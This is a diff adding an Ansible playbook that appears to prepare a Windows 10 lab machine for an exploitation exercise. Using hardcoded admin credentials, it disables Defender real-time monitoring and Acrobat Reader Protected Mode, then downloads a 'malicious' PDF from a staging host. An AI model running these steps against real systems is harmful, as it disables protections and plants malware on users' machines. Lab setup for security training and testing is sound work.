@@ -1,0 +1,37 @@
+---
+- name: Prepare Win10 for Exploitation
+  hosts: win10
+  gather_facts: no
+  vars:
+    ansible_user: "vagrant"
+    ansible_password: "vagrant"
+    ansible_connection: winrm
+    ansible_winrm_transport: ntlm
+    ansible_winrm_server_cert_validation: ignore
+    ansible_become: yes
+    ansible_become_method: runas
+    ansible_become_user: "SERINI\\Administrator"
+    ansible_become_password: "P@ssw0rd123!"
+
+  tasks:
+    - name: Disable Windows Defender Real-time Monitoring
+      ansible.windows.win_shell: Set-MpPreference -DisableRealtimeMonitoring $true
+
+    - name: Disable Acrobat Reader Protected Mode (Registry)
+      ansible.windows.win_regedit:
+        path: HKLM:\SOFTWARE\Policies\Adobe\Acrobat Reader\DC\FeatureLockDown
+        name: bProtectedMode
+        data: 0
+        type: dword
+
+    - name: Disable Acrobat Reader Protected Mode (Enable Key)
+      ansible.windows.win_regedit:
+        path: HKLM:\SOFTWARE\Policies\Adobe\Acrobat Reader\DC\FeatureLockDown
+        name: bEnableProtectedMode
+        data: 0
+        type: dword
+
+    - name: Download Malicious PDF
+      ansible.windows.win_get_url:
+        url: http://192.168.121.50:8000/invoice_scan.pdf
+        dest: C:\Users\Public\Desktop\Invoice_Malicious.pdf
